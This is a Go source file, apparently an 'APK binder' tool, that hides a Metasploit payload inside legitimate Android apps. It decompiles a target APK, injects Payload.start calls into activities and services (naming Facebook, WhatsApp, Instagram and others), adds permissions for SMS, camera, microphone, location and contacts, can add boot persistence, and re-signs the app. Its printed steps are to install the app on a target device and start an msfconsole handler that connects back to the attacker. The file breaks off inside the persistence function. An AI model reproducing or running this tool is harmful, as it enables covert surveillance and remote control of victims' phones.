package main

import (
    "bufio"
    "bytes"
    "encoding/xml"
    "flag"
    "fmt"
    "io/ioutil"
    "log"
    "net"
    "os"
    "os/exec"
    "path/filepath"
    "regexp"
    "strings"
    "time"
)

const (
    KEYSTORE_PATH      = "./.keystore/android_binder.keystore"
    KEY_ALIAS          = "androidbinder"
    KEYSTORE_PASS      = "android"
    KEY_PASS           = "android"
    PAYLOAD_APK        = "payload.apk"
    DEFAULT_APP_NAME   = "SystemUpdate"
    EMERGENCY_ACTIVITY = "com.metasploit.stage.EmergencyActivity"
)

var (
    PERMISSIONS = []string{
        "android.permission.INTERNET",
        "android.permission.ACCESS_WIFI_STATE",
        "android.permission.CHANGE_WIFI_STATE",
        "android.permission.ACCESS_NETWORK_STATE",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.READ_PHONE_STATE",
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.RECORD_AUDIO",
        "android.permission.CALL_PHONE",
        "android.permission.READ_CONTACTS",
        "android.permission.WRITE_CONTACTS",
        "android.permission.WRITE_SETTINGS",
        "android.permission.CAMERA",
        "android.permission.READ_SMS",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.RECEIVE_BOOT_COMPLETED",
        "android.permission.SET_WALLPAPER",
        "android.permission.READ_CALL_LOG",
        "android.permission.WRITE_CALL_LOG",
        "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    }

    FEATURES = []string{
        "android.hardware.camera",
        "android.hardware.camera.autofocus",
        "android.hardware.microphone",
        "android.hardware.location.gps",
    }

    COMMON_MAIN_ACTIVITIES = map[string][]string{
        "facebook": {
            "com.facebook.katana.LoginActivity",
            "com.facebook.lite.MainActivity",
            "com.facebook.mlite.MainActivity",
            "com.facebook.orca.auth.StartScreenActivity",
        },
        "whatsapp": {
            "com.whatsapp.Main",
            "com.whatsapp.HomeActivity",
            "com.whatsapp.Conversation",
        },
        "instagram": {
            "com.instagram.mainactivity.MainActivity",
            "com.instagram.android.activity.MainTabActivity",
        },
        "twitter": {
            "com.twitter.android.StartActivity",
            "com.twitter.android.MainActivity",
        },
        "chrome": {
            "com.google.android.apps.chrome.Main",
        },
    }

    COMMON_SERVICES = map[string][]string{
        "facebook": {
            "com.facebook.analytics.service.AnalyticsService",
            "com.facebook.push.mqtt.service.MqttPushService",
        },
        "whatsapp": {
            "com.whatsapp.messaging.MessageService",
        },
    }

    ACTIVITY_PATTERNS = []*regexp.Regexp{
        regexp.MustCompile(`onCreate.*Landroid/os/Bundle;`),
        regexp.MustCompile(`setContentView`),
        regexp.MustCompile(`(?i)(main|start|home|launch)`),
        regexp.MustCompile(`(?i)(activity|screen|window)`),
        regexp.MustCompile(`startActivity`),
        regexp.MustCompile(`getIntent`),
    }

    SERVICE_PATTERNS = []*regexp.Regexp{
        regexp.MustCompile(`onStartCommand`),
        regexp.MustCompile(`onBind`),
        regexp.MustCompile(`(?i)service`),
        regexp.MustCompile(`startService`),
    }
)

type AndroidManifest struct {
    XMLName    xml.Name `xml:"manifest"`
    Package    string   `xml:"package,attr"`
    Version    string   `xml:"versionCode,attr"`
    SDK        struct {
        MinSdkVersion    int `xml:"minSdkVersion,attr"`
        TargetSdkVersion int `xml:"targetSdkVersion,attr"`
    } `xml:"uses-sdk"`
    Application struct {
        Name        string     `xml:"name,attr"`
        Label       string     `xml:"label,attr"`
        Icon        string     `xml:"icon,attr"`
        Theme       string     `xml:"theme,attr"`
        Activities  []Activity `xml:"activity"`
        Services    []Service  `xml:"service"`
        Receivers   []Receiver `xml:"receiver"`
        MetaData    []MetaData `xml:"meta-data"`
    } `xml:"application"`
    UsesPermission []UsesPermission `xml:"uses-permission"`
}

type UsesPermission struct {
    Name string `xml:"name,attr"`
}

type Activity struct {
    Name          string         `xml:"name,attr"`
    Label         string         `xml:"label,attr"`
    Exported      string         `xml:"exported,attr"`
    IntentFilters []IntentFilter `xml:"intent-filter"`
}

type Service struct {
    Name          string         `xml:"name,attr"`
    Exported      string         `xml:"exported,attr"`
    IntentFilters []IntentFilter `xml:"intent-filter"`
}

type Receiver struct {
    Name          string         `xml:"name,attr"`
    Exported      string         `xml:"exported,attr"`
    IntentFilters []IntentFilter `xml:"intent-filter"`
}

type MetaData struct {
    Name  string `xml:"name,attr"`
    Value string `xml:"value,attr"`
}

type IntentFilter struct {
    Actions    []Action    `xml:"action"`
    Categories []Category  `xml:"category"`
}

type Action struct {
    Name string `xml:"name,attr"`
}

type Category struct {
    Name string `xml:"name,attr"`
}

func main() {
    lhost := flag.String("lhost", "", "Listener IP address")
    lport := flag.String("lport", "443", "Listener port")
    target := flag.String("target", "", "Path to original APK")
    output := flag.String("output", "binded.apk", "Output APK filename")
    keystorePass := flag.String("keystore-pass", "android", "Keystore password")
    https := flag.Bool("https", true, "Use HTTPS payload")
    delay := flag.Int("delay", 0, "Payload activation delay (seconds)")
    persist := flag.Bool("persist", false, "Enable persistence across reboots")
    debug := flag.Bool("debag", false, "Enable debug output")
    mainActivity := flag.String("main-activity", "", "Manually specify main activity (full or partial name)")
    injectAll := flag.Bool("inject-all", false, "Inject into all potential entry points")
    force := flag.Bool("force", false, "Force injection when no activities found")
    flag.Parse()

    if *lhost == "" || *target == "" {
        fmt.Println("Missing required arguments")
        fmt.Println("Usage: apkbinder -lhost <IP> -target <APK> [-lport PORT] [-output FILE] [-https] [-persist]")
        flag.Usage()
        os.Exit(1)
    }

    if net.ParseIP(*lhost) == nil {
        if *lhost != "localhost" && !strings.Contains(*lhost, ".") {
            log.Fatal("Invalid IP address specified for LHOST")
        }
    }

    fmt.Println(`
    ██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗ ██╗███╗   ██╗██████╗ ███████╗██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
    ██████╔╝███████║██████╔╝█████╔╝     ██████╔╝██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
    ██╔═══╝ ██╔══██║██╔═══╝ ██╔═██╗     ██╔══██╗██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
    ██║     ██║  ██║██║     ██║  ██╗    ██████╔╝██║██║ ╚████║██████╔╝███████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝    ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
    `)

    fmt.Printf("[*] Starting APK binding process at %s\n", time.Now().Format("2006-01-02 15:04:05"))
    fmt.Println("[*] Configuration:")
    fmt.Printf("    LHOST:        %s\n", *lhost)
    fmt.Printf("    LPORT:        %s\n", *lport)
    fmt.Printf("    Target APK:   %s\n", *target)
    fmt.Printf("    Output APK:   %s\n", *output)
    fmt.Printf("    HTTPS:        %v\n", *https)
    fmt.Printf("    Persistence:  %v\n", *persist)
    fmt.Printf("    Delay:        %d seconds\n", *delay)
    fmt.Printf("    Debug:        %v\n", *debug)
    fmt.Printf("    Inject All:   %v\n", *injectAll)
    fmt.Printf("    Force:        %v\n", *force)
    if *mainActivity != "" {
        fmt.Printf("    Main Activity: %s\n", *mainActivity)
    }

    // Create directories
    os.MkdirAll("./tmp/payload", 0755)
    os.MkdirAll("./tmp/original", 0755)
    os.MkdirAll("./tmp/output", 0755)
    os.MkdirAll(filepath.Dir(KEYSTORE_PATH), 0700)

    // Generate payload
    generatePayload(*lhost, *lport, *https, *delay, *persist)
    decompileAPK(PAYLOAD_APK, "./tmp/payload", *debug)
    decompileAPK(*target, "./tmp/original", *debug)

    manifest, err := parseManifest("./tmp/original/AndroidManifest.xml")
    if err != nil {
        log.Printf("[!] Warning: Failed to parse AndroidManifest.xml: %v", err)
        log.Println("[*] Creating minimal manifest structure...")
        manifest = &AndroidManifest{
            Package: "unknown.package",
        }
    }

    var targetComponents []string
    if *mainActivity != "" {
        foundActivity := findActivityByName(*mainActivity, manifest.Package, *debug)
        if foundActivity == "" {
            log.Printf("[!] Could not find specified activity: %s", *mainActivity)
            log.Println("[*] Falling back to searching for similar activities...")
            foundActivity = findSimilarFile(*mainActivity, *debug)
            if foundActivity == "" {
                if *force {
                    log.Println("[!] Could not find specified activity, but forcing continuation")
                    foundActivity = EMERGENCY_ACTIVITY
                    createEmergencyActivity(manifest, *debug)
                } else {
                    log.Fatalf("[!] Could not find specified activity or similar: %s", *mainActivity)
                }
            }
        }
        fmt.Printf("[*] Using specified activity: %s\n", foundActivity)
        targetComponents = append(targetComponents, foundActivity)
    } else if *injectAll {
        targetComponents = findAllEntryPoints(manifest, *target, *debug)
        if len(targetComponents) == 0 {
            log.Println("[!] Could not find any entry points through normal methods")
            if *force {
                log.Println("[*] Force flag set - attempting emergency injection")
                targetComponents = emergencyInjection(manifest, *debug)
                if len(targetComponents) == 0 {
                    log.Fatal("[!] Emergency injection failed - no components found")
                }
            } else {
                log.Fatal("[!] Could not find any entry points for injection (use -force to attempt emergency injection)")
            }
        }
        fmt.Printf("[*] Found %d entry points for injection\n", len(targetComponents))
    } else {
        foundActivity := findMainActivity(manifest, *target, *debug)
        if foundActivity == "" {
            log.Println("[!] Could not determine main activity, falling back to first available")
            foundActivity = fallbackFindAnyActivity(manifest, *debug)
            if foundActivity == "" {
                log.Println("[!] Could not find any activity in manifest")
                if *force {
                    log.Println("[*] Force flag set - creating emergency activity")
                    foundActivity = EMERGENCY_ACTIVITY
                    createEmergencyActivity(manifest, *debug)
                } else {
                    log.Fatal("[!] Could not find any activity to inject into (use -force to create emergency entry point)")
                }
            }
        }
        fmt.Printf("[*] Determined injection point: %s\n", foundActivity)
        targetComponents = append(targetComponents, foundActivity)
    }

    injectPayloadComponents(manifest, targetComponents, *persist, *debug)
    rebuildAPK("./tmp/original", *output, *debug)
    signAPK(*output, *keystorePass, *debug)

    fmt.Printf("\n[+] Successfully created bound APK: %s\n", *output)
    fmt.Println("[*] Next steps:")
    fmt.Println("    1. Install the APK on target device")
    fmt.Printf("    2. Start Metasploit listener:\n")
    fmt.Printf("       msfconsole -q -x 'use exploit/multi/handler; set payload %s; set LHOST %s; set LPORT %s; exploit'\n", getPayloadName(*https), *lhost, *lport)
    fmt.Println("    3. Wait for connection (consider using ngrok if testing externally)")

    if promptYesNo("\nDo you want to clean up temporary files?") {
        cleanup()
    }
}

func createEmergencyActivity(manifest *AndroidManifest, debug bool) string {
    // Create emergency activity smali file
    activityPath := filepath.Join("./tmp/original/smali", strings.Replace(EMERGENCY_ACTIVITY, ".", "/", -1)+".smali")
    os.MkdirAll(filepath.Dir(activityPath), 0755)

    smaliCode := `.class public Lcom/metasploit/stage/EmergencyActivity;
.super Landroid/app/Activity;
.source "EmergencyActivity.java"

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const-string v0, "EmergencyActivity"
    const-string v1, "Emergency activity created"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    invoke-virtual {p0}, Lcom/metasploit/stage/EmergencyActivity;->finish()V

    return-void
.end method
`

    err := ioutil.WriteFile(activityPath, []byte(smaliCode), 0644)
    if err != nil {
        log.Fatalf("[!] Failed to create emergency activity: %v", err)
    }

    // Add to manifest
    manifest.Application.Activities = append(manifest.Application.Activities, Activity{
        Name:     EMERGENCY_ACTIVITY,
        Exported: "true",
        IntentFilters: []IntentFilter{
            {
                Actions: []Action{
                    {Name: "android.intent.action.MAIN"},
                },
                Categories: []Category{
                    {Name: "android.intent.category.LAUNCHER"},
                },
            },
        },
    })

    // Update manifest file
    updateManifest(manifest, debug)

    if debug {
        fmt.Printf("[*] Created emergency activity at %s\n", EMERGENCY_ACTIVITY)
    }

    return EMERGENCY_ACTIVITY
}

func emergencyInjection(manifest *AndroidManifest, debug bool) []string {
    var targets []string

    // Try to find any .smali file
    filepath.Walk("./tmp/original/smali", func(path string, info os.FileInfo, err error) error {
        if strings.HasSuffix(path, ".smali") {
            relPath := strings.TrimPrefix(path, "./tmp/original/smali/")
            className := strings.TrimSuffix(relPath, ".smali")
            fullName := strings.Replace(className, "/", ".", -1)
            targets = append(targets, fullName)
            return filepath.SkipDir // Just need one
        }
        return nil
    })

    if len(targets) == 0 {
        // Last resort - create emergency activity
        if debug {
            fmt.Println("[*] No .smali files found, creating emergency activity")
        }
        targets = append(targets, createEmergencyActivity(manifest, debug))
    }

    return targets
}

func findSimilarFile(className string, debug bool) string {
    parts := strings.Split(className, ".")
    if len(parts) == 0 {
        return ""
    }
    lastPart := parts[len(parts)-1]
    
    var foundPath string
    filepath.Walk("./tmp/original/smali", func(path string, info os.FileInfo, err error) error {
        if strings.HasSuffix(path, ".smali") && strings.Contains(strings.ToLower(path), strings.ToLower(lastPart)) {
            foundPath = path
            return filepath.SkipDir
        }
        return nil
    })

    if foundPath != "" {
        relPath := strings.TrimPrefix(foundPath, "./tmp/original/smali/")
        foundClass := strings.TrimSuffix(relPath, ".smali")
        fullName := strings.Replace(foundClass, "/", ".", -1)
        if debug {
            fmt.Printf("[*] Found similar file for %s: %s\n", className, fullName)
        }
        return fullName
    }
    return ""
}

func findAllEntryPoints(manifest *AndroidManifest, apkPath string, debug bool) []string {
    var entryPoints []string

    // 1. Find all MAIN/LAUNCHER activities
    for _, activity := range manifest.Application.Activities {
        for _, filter := range activity.IntentFilters {
            hasMain := false
            hasLauncher := false
            
            for _, action := range filter.Actions {
                if action.Name == "android.intent.action.MAIN" {
                    hasMain = true
                }
            }
            for _, category := range filter.Categories {
                if category.Name == "android.intent.category.LAUNCHER" {
                    hasLauncher = true
                }
            }

            if hasMain || hasLauncher {
                smaliPath := filepath.Join("./tmp/original/smali", strings.Replace(activity.Name, ".", "/", -1)+".smali")
                if _, err := os.Stat(smaliPath); err == nil {
                    if debug {
                        fmt.Printf("[*] Found MAIN/LAUNCHER activity: %s\n", activity.Name)
                    }
                    entryPoints = append(entryPoints, activity.Name)
                }
            }
        }
    }

    // 2. Find all exported activities
    for _, activity := range manifest.Application.Activities {
        if activity.Exported == "true" {
            smaliPath := filepath.Join("./tmp/original/smali", strings.Replace(activity.Name, ".", "/", -1)+".smali")
            if _, err := os.Stat(smaliPath); err == nil {
                if debug {
                    fmt.Printf("[*] Found exported activity: %s\n", activity.Name)
                }
                if !contains(entryPoints, activity.Name) {
                    entryPoints = append(entryPoints, activity.Name)
                }
            }
        }
    }

    // 3. Find all services with intent filters
    for _, service := range manifest.Application.Services {
        if len(service.IntentFilters) > 0 {
            smaliPath := filepath.Join("./tmp/original/smali", strings.Replace(service.Name, ".", "/", -1)+".smali")
            if _, err := os.Stat(smaliPath); err == nil {
                if debug {
                    fmt.Printf("[*] Found service with intent filter: %s\n", service.Name)
                }
                entryPoints = append(entryPoints, service.Name)
            }
        }
    }

    // 4. Find all exported services
    for _, service := range manifest.Application.Services {
        if service.Exported == "true" {
            smaliPath := filepath.Join("./tmp/original/smali", strings.Replace(service.Name, ".", "/", -1)+".smali")
            if _, err := os.Stat(smaliPath); err == nil {
                if debug {
                    fmt.Printf("[*] Found exported service: %s\n", service.Name)
                }
                if !contains(entryPoints, service.Name) {
                    entryPoints = append(entryPoints, service.Name)
                }
            }
        }
    }

    // 5. Find common patterns for known apps
    pkg := manifest.Package
    for app, activities := range COMMON_MAIN_ACTIVITIES {
        if strings.Contains(strings.ToLower(pkg), strings.ToLower(app)) {
            for _, activity := range activities {
                fullPath := filepath.Join("./tmp/original/smali", strings.Replace(activity, ".", "/", -1)+".smali")
                if _, err := os.Stat(fullPath); err == nil {
                    if debug {
                        fmt.Printf("[*] Found common activity: %s\n", activity)
                    }
                    if !contains(entryPoints, activity) {
                        entryPoints = append(entryPoints, activity)
                    }
                }
            }
        }
    }

    // 6. Find common services for known apps
    for app, services := range COMMON_SERVICES {
        if strings.Contains(strings.ToLower(pkg), strings.ToLower(app)) {
            for _, service := range services {
                fullPath := filepath.Join("./tmp/original/smali", strings.Replace(service, ".", "/", -1)+".smali")
                if _, err := os.Stat(fullPath); err == nil {
                    if debug {
                        fmt.Printf("[*] Found common service: %s\n", service)
                    }
                    if !contains(entryPoints, service) {
                        entryPoints = append(entryPoints, service)
                    }
                }
            }
        }
    }

    // 7. Fallback to heuristic search if we still haven't found anything
    if len(entryPoints) == 0 {
        if debug {
            fmt.Println("[*] No entry points found, falling back to heuristic search")
        }
        heuristicActivities := findActivitiesHeuristically("./tmp/original/smali", pkg, debug)
        entryPoints = append(entryPoints, heuristicActivities...)
    }

    return entryPoints
}

func findMainActivity(manifest *AndroidManifest, apkPath string, debug bool) string {
    if debug {
        fmt.Println("[*] Searching for main activity in manifest")
    }

    // 1. Try conventional MAIN/LAUNCHER activities first
    for _, activity := range manifest.Application.Activities {
        for _, filter := range activity.IntentFilters {
            hasMain := false
            hasLauncher := false
            
            for _, action := range filter.Actions {
                if action.Name == "android.intent.action.MAIN" {
                    hasMain = true
                }
            }
            for _, category := range filter.Categories {
                if category.Name == "android.intent.category.LAUNCHER" {
                    hasLauncher = true
                }
            }

            if hasMain && hasLauncher {
                smaliPath := filepath.Join("./tmp/original/smali", strings.Replace(activity.Name, ".", "/", -1)+".smali")
                if _, err := os.Stat(smaliPath); err == nil {
                    if debug {
                        fmt.Printf("[*] Found MAIN/LAUNCHER activity: %s\n", activity.Name)
                    }
                    return activity.Name
                } else if debug {
                    fmt.Printf("[*] Activity %s not found at %s\n", activity.Name, smaliPath)
                }
            }
        }
    }

    // 2. Try any activity with MAIN action
    if debug {
        fmt.Println("[*] No MAIN/LAUNCHER activity found, trying any MAIN activity")
    }
    for _, activity := range manifest.Application.Activities {
        for _, filter := range activity.IntentFilters {
            for _, action := range filter.Actions {
                if action.Name == "android.intent.action.MAIN" {
                    smaliPath := filepath.Join("./tmp/original/smali", strings.Replace(activity.Name, ".", "/", -1)+".smali")
                    if _, err := os.Stat(smaliPath); err == nil {
                        if debug {
                            fmt.Printf("[*] Found MAIN activity: %s\n", activity.Name)
                        }
                        return activity.Name
                    }
                }
            }
        }
    }

    // 3. Try exported activities
    if debug {
        fmt.Println("[*] Trying exported activities")
    }
    for _, activity := range manifest.Application.Activities {
        if activity.Exported == "true" {
            smaliPath := filepath.Join("./tmp/original/smali", strings.Replace(activity.Name, ".", "/", -1)+".smali")
            if _, err := os.Stat(smaliPath); err == nil {
                if debug {
                    fmt.Printf("[*] Found exported activity: %s\n", activity.Name)
                }
                return activity.Name
            }
        }
    }

    // 4. Try common patterns for known apps
    pkg := manifest.Package
    if debug {
        fmt.Printf("[*] Trying common patterns for package: %s\n", pkg)
    }
    for app, activities := range COMMON_MAIN_ACTIVITIES {
        if strings.Contains(strings.ToLower(pkg), strings.ToLower(app)) {
            for _, activity := range activities {
                fullPath := filepath.Join("./tmp/original/smali", strings.Replace(activity, ".", "/", -1)+".smali")
                if _, err := os.Stat(fullPath); err == nil {
                    if debug {
                        fmt.Printf("[*] Found common activity: %s\n", activity)
                    }
                    return activity
                }
            }
        }
    }

    // 5. Last resort: heuristic search
    if debug {
        fmt.Println("[*] Performing heuristic search for main activity")
    }
    return findActivityHeuristically("./tmp/original/smali", pkg, debug)
}

func fallbackFindAnyActivity(manifest *AndroidManifest, debug bool) string {
    if debug {
        fmt.Println("[*] Falling back to finding any activity")
    }

    // First try: Any activity in the manifest
    for _, activity := range manifest.Application.Activities {
        smaliPath := filepath.Join("./tmp/original/smali", strings.Replace(activity.Name, ".", "/", -1)+".smali")
        if _, err := os.Stat(smaliPath); err == nil {
            if debug {
                fmt.Printf("[*] Found activity in manifest: %s\n", activity.Name)
            }
            return activity.Name
        }
    }

    // Second try: First activity found in smali directory
    var firstActivity string
    filepath.Walk("./tmp/original/smali", func(path string, info os.FileInfo, err error) error {
        if strings.HasSuffix(path, ".smali") && strings.Contains(path, "Activity.smali") {
            relPath := strings.TrimPrefix(path, "./tmp/original/smali/")
            className := strings.TrimSuffix(relPath, ".smali")
            firstActivity = strings.Replace(className, "/", ".", -1)
            return filepath.SkipDir
        }
        return nil
    })

    if firstActivity != "" {
        if debug {
            fmt.Printf("[*] Using first found activity: %s\n", firstActivity)
        }
        return firstActivity
    }

    return ""
}

func findActivityHeuristically(smaliDir, pkg string, debug bool) string {
    var candidates []string
    filepath.Walk(smaliDir, func(path string, info os.FileInfo, err error) error {
        if strings.HasSuffix(path, "Activity.smali") {
            content, err := ioutil.ReadFile(path)
            if err != nil {
                return nil
            }

            score := 0
            for _, pattern := range ACTIVITY_PATTERNS {
                if pattern.Match(content) {
                    score++
                }
            }

            if score >= 2 {
                relPath := strings.TrimPrefix(path, smaliDir+"/")
                className := strings.TrimSuffix(relPath, ".smali")
                candidates = append(candidates, strings.Replace(className, "/", ".", -1))
            }
        }
        return nil
    })

    if debug {
        fmt.Printf("[*] Found %d candidate activities\n", len(candidates))
        for _, c := range candidates {
            fmt.Printf("    - %s\n", c)
        }
    }

    if len(candidates) > 0 {
        // Prefer candidates in the same package
        for _, candidate := range candidates {
            if strings.Contains(candidate, pkg) {
                return candidate
            }
        }
        // Fallback to first candidate
        return candidates[0]
    }

    return ""
}

func findActivitiesHeuristically(smaliDir, pkg string, debug bool) []string {
    var candidates []string

    // Search for activities
    filepath.Walk(smaliDir, func(path string, info os.FileInfo, err error) error {
        if strings.HasSuffix(path, "Activity.smali") {
            content, err := ioutil.ReadFile(path)
            if err != nil {
                return nil
            }

            score := 0
            for _, pattern := range ACTIVITY_PATTERNS {
                if pattern.Match(content) {
                    score++
                }
            }

            if score >= 2 {
                relPath := strings.TrimPrefix(path, smaliDir+"/")
                className := strings.TrimSuffix(relPath, ".smali")
                candidates = append(candidates, strings.Replace(className, "/", ".", -1))
            }
        }
        return nil
    })

    // Search for services
    filepath.Walk(smaliDir, func(path string, info os.FileInfo, err error) error {
        if strings.HasSuffix(path, "Service.smali") {
            content, err := ioutil.ReadFile(path)
            if err != nil {
                return nil
            }

            score := 0
            for _, pattern := range SERVICE_PATTERNS {
                if pattern.Match(content) {
                    score++
                }
            }

            if score >= 2 {
                relPath := strings.TrimPrefix(path, smaliDir+"/")
                className := strings.TrimSuffix(relPath, ".smali")
                candidates = append(candidates, strings.Replace(className, "/", ".", -1))
            }
        }
        return nil
    })

    if debug {
        fmt.Printf("[*] Found %d candidate entry points\n", len(candidates))
        for _, c := range candidates {
            fmt.Printf("    - %s\n", c)
        }
    }

    return candidates
}

func findActivityByName(activityName, pkg string, debug bool) string {
    pkgPath := strings.Replace(pkg, ".", "/", -1)
    if debug {
        fmt.Printf("[*] Searching for activity '%s' in package '%s' (%s)\n", activityName, pkg, pkgPath)
    }

    var foundPath string
    filepath.Walk("./tmp/original/smali", func(path string, info os.FileInfo, err error) error {
        if strings.HasSuffix(path, ".smali") {
            // Exact match check
            if strings.Contains(path, strings.Replace(activityName, ".", "/", -1)+".smali") {
                foundPath = path
                if debug {
                    fmt.Printf("[*] Found exact match at: %s\n", path)
                }
                return filepath.SkipDir
            }

            // Partial match check (last component)
            parts := strings.Split(activityName, ".")
            if len(parts) > 0 {
                lastPart := parts[len(parts)-1]
                if strings.Contains(filepath.Base(path), lastPart+".smali") {
                    if debug {
                        fmt.Printf("[*] Found partial match at: %s\n", path)
                    }
                    foundPath = path
                    return filepath.SkipDir
                }
            }
        }
        return nil
    })

    if foundPath != "" {
        relPath := strings.TrimPrefix(foundPath, "./tmp/original/smali/")
        className := strings.TrimSuffix(relPath, ".smali")
        return strings.Replace(className, "/", ".", -1)
    }

    return ""
}

func injectPayloadComponents(manifest *AndroidManifest, targetComponents []string, persist, debug bool) {
    fmt.Printf("\n[+] Injecting payload components into %d targets\n", len(targetComponents))

    // Copy payload smali
    srcDir := "./tmp/payload/smali/com/metasploit"
    destDir := "./tmp/original/smali/com/metasploit"
    if err := os.MkdirAll(filepath.Dir(destDir), 0755); err != nil {
        log.Fatalf("[!] Failed to create smali directory: %v", err)
    }
    
    // Remove existing payload if any
    os.RemoveAll(destDir)
    
    // Copy new payload
    if err := copyDir(srcDir, destDir); err != nil {
        log.Fatalf("[!] Failed to copy payload smali: %v", err)
    }

    // Inject into each target component
    for _, target := range targetComponents {
        if strings.Contains(target, "Activity") {
            injectPayloadIntoActivity(target, debug)
        } else if strings.Contains(target, "Service") {
            injectPayloadIntoService(target, debug)
        } else {
            fmt.Printf("[*] Skipping unknown component type: %s\n", target)
        }
    }

    // Add persistence if requested
    if persist {
        injectPersistence(manifest, debug)
    }

    // Update manifest
    updateManifest(manifest, debug)
}

func injectPayloadIntoActivity(activityPath string, debug bool) {
    fmt.Printf("[*] Injecting into activity: %s\n", activityPath)

    smaliPath := strings.Replace(activityPath, ".", "/", -1)
    smaliFile := fmt.Sprintf("./tmp/original/smali/%s.smali", smaliPath)

    content, err := ioutil.ReadFile(smaliFile)
    if err != nil {
        if debug {
            fmt.Printf("[*] Primary path not found (%s), searching alternatives\n", smaliFile)
        }

        // Search for activity file
        var found bool
        filepath.Walk("./tmp/original/smali", func(path string, info os.FileInfo, err error) error {
            if !found && strings.HasSuffix(path, filepath.Base(smaliFile)) {
                smaliFile = path
                content, err = ioutil.ReadFile(path)
                if err == nil {
                    found = true
                    if debug {
                        fmt.Printf("[*] Found at alternate path: %s\n", path)
                    }
                }
            }
            return nil
        })

        if !found {
            log.Fatalf("[!] Could not find activity file for %s", activityPath)
        }
    }

    if bytes.Contains(content, []byte("Lcom/metasploit/stage/Payload;")) {
        fmt.Println("[*] Payload already injected")
        return
    }

    // Find injection point
    onCreateIndex := bytes.Index(content, []byte(".method public onCreate("))
    if onCreateIndex == -1 {
        if debug {
            fmt.Println("[*] onCreate not found, trying other entry points")
        }
        onCreateIndex = bytes.Index(content, []byte(".method public onStart("))
        if onCreateIndex == -1 {
            onCreateIndex = bytes.Index(content, []byte(".method public onResume("))
            if onCreateIndex == -1 {
                log.Fatal("[!] Could not find suitable injection point")
            }
        }
    }

    returnIndex := bytes.Index(content[onCreateIndex:], []byte("return-void"))
    if returnIndex == -1 {
        log.Fatal("[!] Could not find return-void in target method")
    }
    injectionPoint := onCreateIndex + returnIndex

    // Prepare injection code
    injection := []byte("\n    const-string v0, \"PayloadStarting\"\n" +
        "    invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I\n" +
        "    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V")

    // Insert payload call
    newContent := make([]byte, 0, len(content)+len(injection))
    newContent = append(newContent, content[:injectionPoint]...)
    newContent = append(newContent, injection...)
    newContent = append(newContent, content[injectionPoint:]...)

    err = ioutil.WriteFile(smaliFile, newContent, 0644)
    if err != nil {
        log.Fatalf("[!] Failed to write modified activity: %v", err)
    }

    fmt.Printf("[+] Successfully injected into %s\n", smaliFile)
}

func injectPayloadIntoService(servicePath string, debug bool) {
    fmt.Printf("[*] Injecting into service: %s\n", servicePath)

    smaliPath := strings.Replace(servicePath, ".", "/", -1)
    smaliFile := fmt.Sprintf("./tmp/original/smali/%s.smali", smaliPath)

    content, err := ioutil.ReadFile(smaliFile)
    if err != nil {
        if debug {
            fmt.Printf("[*] Primary path not found (%s), searching alternatives\n", smaliFile)
        }

        // Search for service file
        var found bool
        filepath.Walk("./tmp/original/smali", func(path string, info os.FileInfo, err error) error {
            if !found && strings.HasSuffix(path, filepath.Base(smaliFile)) {
                smaliFile = path
                content, err = ioutil.ReadFile(path)
                if err == nil {
                    found = true
                    if debug {
                        fmt.Printf("[*] Found at alternate path: %s\n", path)
                    }
                }
            }
            return nil
        })

        if !found {
            log.Fatalf("[!] Could not find service file for %s", servicePath)
        }
    }

    if bytes.Contains(content, []byte("Lcom/metasploit/stage/Payload;")) {
        fmt.Println("[*] Payload already injected")
        return
    }

    // Find injection point - try onStartCommand first
    injectionPoint := -1
    methodStart := bytes.Index(content, []byte(".method public onStartCommand("))
    if methodStart != -1 {
        returnIndex := bytes.Index(content[methodStart:], []byte("return-void"))
        if returnIndex != -1 {
            injectionPoint = methodStart + returnIndex
        }
    }

    // Fallback to onCreate if onStartCommand not found
    if injectionPoint == -1 {
        methodStart = bytes.Index(content, []byte(".method public onCreate("))
        if methodStart != -1 {
            returnIndex := bytes.Index(content[methodStart:], []byte("return-void"))
            if returnIndex != -1 {
                injectionPoint = methodStart + returnIndex
            }
        }
    }

    if injectionPoint == -1 {
        log.Fatal("[!] Could not find suitable injection point in service")
    }

    // Prepare injection code
    injection := []byte("\n    const-string v0, \"PayloadStarting\"\n" +
        "    invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I\n" +
        "    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V")

    // Insert payload call
    newContent := make([]byte, 0, len(content)+len(injection))
    newContent = append(newContent, content[:injectionPoint]...)
    newContent = append(newContent, injection...)
    newContent = append(newContent, content[injectionPoint:]...)

    err = ioutil.WriteFile(smaliFile, newContent, 0644)
    if err != nil {
        log.Fatalf("[!] Failed to write modified service: %v", err)
    }

    fmt.Printf("[+] Successfully injected into %s\n", smaliFile)
}

func injectPersistence(manifest *AndroidManifest, debug bool) {
    fmt.Println("[*] Adding persistence components")

    receiverName := "com.metasploit.stage.PersistenceReceiver"
    manifest.Application.Receivers = append(manifest.Application.Receivers, Receiver{
        Name:     receiverName,
        Exported: "true",
    })

    receiverPath := fmt.Sprintf("./tmp/original/smali/%s.smali", strings.Replace(receiverName, ".", "/", -1))
